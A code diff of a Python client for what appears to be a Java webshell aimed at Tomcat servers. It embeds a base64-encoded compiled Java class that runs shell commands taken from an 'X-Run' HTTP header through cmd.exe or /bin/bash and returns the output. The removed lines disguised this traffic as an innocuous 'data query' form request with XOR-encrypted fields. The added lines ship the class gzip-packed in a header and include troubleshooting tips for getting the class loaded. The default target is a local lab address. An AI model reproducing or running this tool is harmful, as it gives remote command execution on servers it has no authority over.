@@ -1,26 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-数据查询中心 | 通道: classbytes | 用法: python 2.py <url>
-"""
-import base64, hashlib, random, re, sys, urllib.parse, urllib.request
+import base64, gzip, re, sys, urllib.request
 
 URL = sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1/'
 ARG = sys.argv[2] if len(sys.argv) > 2 else None
-MARKER = 'seg-pack-20'
-SALT = 'fum0-pack'
+MARKER = 'pack-diag'
 
-def ks(nonce):
-    return hashlib.md5((nonce + SALT).encode()).hexdigest().encode()
-
-def xor_hex(data: bytes, nonce: str) -> str:
-    k = ks(nonce)
-    return ''.join('%02x' % (b ^ k[i % 32]) for i, b in enumerate(data))
-
-def hex_xor(hexstr: str, nonce: str) -> bytes:
-    k = ks(nonce)
-    raw = bytes.fromhex(hexstr)
-    return bytes(b ^ k[i % 32] for i, b in enumerate(raw))
+# 实验环境直连, 禁用系统代理(Windows 下 urllib 默认跟随系统代理, 127.0.0.1 会被拦)
+_opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
 
 def fetch(data=None, headers=None):
     req = urllib.request.Request(URL, data=data, headers=headers or {})
@@ -34,23 +21,17 @@ def out(html):
 
 def run_once(cmd):
     CLS = 'yv66vgAAADQAZgoAGwAvCAAwCwAxADIKABIAMwgANAoAGgA1CAA2CAA3CgA4ADkKABIAOggAOwoAEgA8CAA9CAA+CAA/CABACgBBAEIHAEMKAEEARAoARQBGBwBHCgAVAC8KAEgASQoAFQBKCgAVAEsHAEwHAE0BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAEZXhlYwEAOyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAQwEACkV4Y2VwdGlvbnMHAE4BAANydW4BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7BwBPBwBQBwBHBwBRAQAKU291cmNlRmlsZQEADFBheWxvYWQuamF2YQwAHAAdAQAFWC1SdW4HAFIMAFMAKAwAVABVAQAFbm8tb3AMACYAKAEADGlkOyB1bmFtZSAtYQEAB29zLm5hbWUHAFYMAFcAKAwAWAAnAQADd2luDABZAFoBAAdjbWQuZXhlAQAJL2Jpbi9iYXNoAQACL2MBAAItYwcAWwwAXABdAQAQamF2YS9sYW5nL1N0cmluZwwAIABeBwBPDABfAGABAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcAUAwAYQBiDABjAGQMAGUAJwEAB1BheWxvYWQBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAAltCAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEACWdldEhlYWRlcgEAB2lzRW1wdHkBAAMoKVoBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAARyZWFkAQAFKFtCKUkBAAV3cml0ZQEAByhbQklJKVYBAAh0b1N0cmluZwAhABoAGwAAAAAABAABABwAHQABAB4AAAAdAAEAAQAAAAUqtwABsQAAAAEAHwAAAAYAAQAAABMAAQAgACEAAgAeAAAATwACAAMAAAAcKxICuQADAgBNLMYACiy2AASZAAYSBbAsuAAGsAAAAAIAHwAAABIABAAAABcACQAYABQAGQAXABsAIgAAAAkAAvwAFAcAIwIAJAAAAAQAAQAlAAEAJgAnAAIAHgAAAB4AAQABAAAABhIHuAAGsAAAAAEAHwAAAAYAAQAAACAAJAAAAAQAAQAlAAoAJgAoAAIAHgAAAOgABQAJAAAAdRIIuAAJtgAKEgu2AAw8G5kACBINpwAFEg5NG5kACBIPpwAFEhBOuAARBr0AElkDLFNZBC1TWQUqU7YAEzoEGQS2ABQ6BbsAFVm3ABY6BhECALwIOgcZBRkHtgAXWTYIngAQGQYZBwMVCLYAGKf/6RkGtgAZsAAAAAIAHwAAACYACQAAACUADgAmABoAJwAmACgAPgApAEUAKgBOACsAVQAtAG8ALgAiAAAANQAG/AAXAUEHACP8AAkHACNBBwAj/wAvAAgHACMBBwAjBwAjBwApBwAqBwArBwAsAAD8ABkBACQAAAAEAAEAJQABAC0AAAACAC4='
-    cred = CLS
-    nonce = ''.join(random.choice('0123456789abcdef') for _ in range(8))
-    body = urllib.parse.urlencode({
-        'ts': '1730000000', 'nonce': nonce, 'signature': xor_hex(cred.encode(), nonce),
-        'pageSize': '20', 'pageIndex': '1',
-    }).encode()
+    packed = base64.b64encode(gzip.compress(base64.b64decode(CLS))).decode()
     headers = {
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'X-Requested-With': 'XMLHttpRequest',
+        'X-Pack': packed,
+        'X-Run': cmd,
         'Referer': URL,
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-        'Origin': URL.rsplit('/', 1)[0],
-        'X-Run': cmd,
     }
-    d = out(fetch(data=body, headers=headers))
-    nonce2, payload = d.split(':', 1)
-    return base64.b64decode(hex_xor(payload, nonce2)).decode('utf-8', 'replace')
+    d = out(fetch(headers=headers))
+    if not d:
+        sys.exit('服务端无回显(若一直如此, 检查 Tomcat 的 JDK 版本: JDK16+ 默认强封装会阻断反射 defineClass)')
+    return base64.b64decode(d).decode('utf-8', 'replace')
 
 if __name__ == '__main__':
     if ARG is not None:
